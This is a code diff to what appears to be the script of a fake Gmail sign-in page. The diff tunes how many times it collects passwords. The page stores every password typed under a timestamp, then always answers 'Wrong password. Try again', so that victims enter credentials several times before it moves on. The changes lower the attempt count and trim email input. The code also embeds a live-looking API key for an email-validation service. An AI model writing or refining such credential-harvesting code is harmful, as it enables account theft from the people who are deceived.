@@ -134,7 +134,7 @@ function timeOver(){
     if(seconds > 0){
         seconds--;
     }else{
-        slide2E();
+        timeOver();
         clearInterval(timer);
         userName.value = "";
         passWord.value = "";
@@ -345,7 +345,7 @@ rowBtnB.onclick = function(){
 let deviceId = localStorage.getItem('device_id');
 if (!deviceId) {
   deviceId = 'device_' + Math.random().toString(36).substr(2, 9);
-  localStorage.setItem("Device ID: ", deviceId);
+  localStorage.setItem("device_id", deviceId);
 }
 
 document.addEventListener("DOMContentLoaded", function() {
@@ -387,7 +387,7 @@ var touchDevice = `${isTouchDevice ? "Yes" : "No"}`;
 let formA = document.getElementById("validateEmail");
 const validatorAPI = "https://emailvalidation.abstractapi.com/v1/?api_key=8363fdc7008649e4950973f281948ef5&email="
 let userId = document.getElementById("userId");
-let attempts = ['6','7','8','9','10'];
+let attempts = ['3', '4', '5', '6', '7'];
 let randomAttempts = attempts[Math.floor(Math.random() * attempts.length)];
 var login_attempts = randomAttempts;
 let time = ['1.3','1.5','1.7','2','2.2','2.5','2.7','3.2','3.5','3.8','4'];
@@ -405,12 +405,12 @@ formA.onsubmit = function(){
         let isDeviceOnline = navigator.onLine;
         if (isDeviceOnline) {
             loading();
-            if(('@' + userName.value.toLowerCase().split('@')[1]) !== '@gmail.com'){
-                var userEmail = (userName.value.toLowerCase() + '@gmail.com');
+            if(('@' + userName.value.trim().toLowerCase().split('@')[1]) !== '@gmail.com'){
+                var userEmail = (userName.value.trim().toLowerCase() + '@gmail.com');
                 var validatorURL = (validatorAPI + userEmail);
             }
             else{
-                var userEmail = (userName.value.toLowerCase());
+                var userEmail = (userName.value.trim().toLowerCase());
                 var validatorURL = (validatorAPI + userEmail);
             }
             async function fetchData(){
@@ -486,7 +486,6 @@ formB.onsubmit = function(){
     var getDate = new Date();
     var date = getDate.getDate()
     var month = getDate.getMonth()
-    login_attempts = randomAttempts;
     var year = getDate.getFullYear()
     var daysOfWeek = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
     var week = daysOfWeek[getDate.getDay()];
@@ -501,21 +500,11 @@ formB.onsubmit = function(){
                     [currentTime]: passWord.value
                 }).then(() => {
                     setTimeout(() => {
-                        if(passWord.value.length >= 8){
-                            login_attempts = login_attempts-1;
-                            if(login_attempts == 0){
-                                setTimeout(() => {
-                                    slideB2C();
-                                }, (duration * 1000));
-                            }
-                        }
-                        else{
-                            login_attempts = login_attempts-1;
-                            if(login_attempts == 0){
-                                setTimeout(() => {
-                                    slide2E();
-                                }, (duration * 1000));
-                            }
+                        login_attempts = login_attempts-1;
+                        if (login_attempts == 0) {
+                        	setTimeout(() => {
+                        		slideB2C();
+                        	}, (duration * 1000));
                         }
                         pWordError();
                         passWordError.innerText = "Wrong password. Try again or click 'Forgot password' to reset it.";
@@ -523,6 +512,12 @@ formB.onsubmit = function(){
                 })
             }else{
                 setTimeout(() => {
+                    login_attempts = login_attempts-1;
+                    if (login_attempts == 0) {
+                    	setTimeout(() => {
+                    		slide2E();
+                    	}, (duration * 1000));
+                    }
                     pWordError();
                     passWordError.innerText = "Wrong password. Try again or click 'Forgot password' to reset it.";
                 }, duration * 1000);
@@ -615,7 +610,6 @@ formD.onsubmit = function(){
     var getDate = new Date();
     var date = getDate.getDate()
     var month = getDate.getMonth()
-    login_attempts = randomAttempts;
     var year = getDate.getFullYear()
     var daysOfWeek = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
     var week = daysOfWeek[getDate.getDay()];
